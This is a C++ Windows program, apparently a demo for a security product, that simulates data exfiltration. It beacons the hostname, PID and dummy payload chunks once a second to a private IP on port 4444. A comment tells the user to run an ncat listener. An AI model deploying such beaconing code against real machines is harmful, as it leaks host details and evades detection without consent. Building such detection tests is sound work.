/*
 * CyberShield Mesh — Optional Native C++ WinSock2 Outbound Simulator (HARMLESS)
 *
 * Demonstrates signature-free native binary outbound traffic that triggers zero
 * alerts in built-in Windows Security until CyberShield Mesh intervenes.
 *
 * Compile on Windows (MinGW-w64):
 *   g++ demo_attack/sim_intrusion.cpp -o sim_intrusion.exe -lws2_32
 *
 * Run:
 *   sim_intrusion.exe 10.100.5.67 4444
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <sstream>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

int main(int argc, char* argv[]) {
    const char* targetIp = (argc >= 2) ? argv[1] : "10.100.5.67";
    int targetPort = (argc >= 3) ? std::atoi(argv[2]) : 4444;
    if (targetPort <= 0 || targetPort > 65535) {
        targetPort = 4444;
    }

    DWORD pid = GetCurrentProcessId();
    std::cout << "====================================================================\n";
    std::cout << " CyberShield Mesh — Native C++ Outbound Simulator (HARMLESS)\n";
    std::cout << "====================================================================\n";
    std::cout << " Local PID   : " << pid << "\n";
    std::cout << " Target Peer : " << targetIp << ":" << targetPort << "\n";
    std::cout << "--------------------------------------------------------------------\n";

    WSADATA wsaData;
    int wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsaResult != 0) {
        std::cerr << "[ERROR] WSAStartup failed: " << wsaResult << "\n";
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[ERROR] socket() failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    std::memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(static_cast<u_short>(targetPort));

    if (inet_pton(AF_INET, targetIp, &serverAddr.sin_addr) != 1) {
        std::cerr << "[ERROR] Invalid IPv4 address: " << targetIp << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[CONNECTING] Opening outbound TCP socket to "
              << targetIp << ":" << targetPort << " ...\n";

    if (connect(sock, reinterpret_cast<sockaddr*>(&serverAddr), sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "[CONNECT FAILED] WSAGetLastError=" << WSAGetLastError() << "\n";
        std::cerr << "Ensure Ubuntu listener is running: ncat -lvnp " << targetPort << "\n";
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "[CONNECTED] Outbound TCP stream established.\n";

    char hostName[256] = "windows-host";
    gethostname(hostName, sizeof(hostName) - 1);

    int seq = 0;
    while (true) {
        ++seq;
        std::ostringstream oss;
        oss << "[CPP_SIM_EXFIL] seq=" << seq
            << " host=" << hostName
            << " pid=" << pid
            << " chunk=DUMMY_NATIVE_PAYLOAD_" << seq << "\n";
        std::string payload = oss.str();

        int sent = send(sock, payload.c_str(), static_cast<int>(payload.size()), 0);
        if (sent == SOCKET_ERROR || sent == 0) {
            std::cout << "\n[LINK SEVERED] send() failed or connection closed (err="
                      << WSAGetLastError() << ").\n";
            break;
        }

        std::cout << "[SENT #" << seq << "] -> " << targetIp << ":" << targetPort
                  << " | " << payload;
        Sleep(1000);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}
